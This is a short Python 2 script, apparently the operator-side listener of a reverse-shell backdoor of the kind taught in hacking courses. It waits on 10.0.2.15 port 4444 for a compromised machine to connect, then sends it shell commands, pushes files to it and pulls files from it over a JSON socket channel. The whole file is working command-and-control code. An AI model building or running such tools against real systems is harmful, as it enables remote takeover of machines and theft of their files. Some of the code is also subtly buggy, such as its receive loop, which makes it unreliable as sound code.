#!/usr/bin/env python

import json, socket, base64

class Listener:
    def __init__(self, ip, port):
        socketData = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socketData.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        socketData.bind((ip, port))
        socketData.listen(0)
        print("[+] Waiting for connection")
        self.connection, address = socketData.accept()
        print("[+] Connection established successfully " + str(address))

    def readFile(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def writeFile(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] File Downloaded Successfully"

    def send(self, data):
        jsonData = json.dumps(data)
        self.connection.send(jsonData)

    def recieve(self):
        jsonData = ""
        while True:
            try:
                jsonData = jsonData + str(self.connection.recv(1024))
                return json.loads(jsonData)
            except Exception:
                continue

    def executeCommands(self, command):
        self.send(command)
        if command[0] == "exit":
            self.connection.close()
            exit()
        return self.recieve()

    def run(self):
        while True:
            try:
                command = raw_input(">> ")
                command = command.split(" ")
                if command[0] == "upload":
                    data = self.readFile(command[1])
                    command.append(data)
                commandRes = self.executeCommands(command)

                if command[0] == "download" and "[-] error" not in commandRes:
                    commandRes = self.writeFile(command[1], commandRes)
            except Exception:
                commandRes = "[-] An error encountered!"
            print(str(commandRes))

runListener = Listener("10.0.2.15", 4444)
runListener.run()
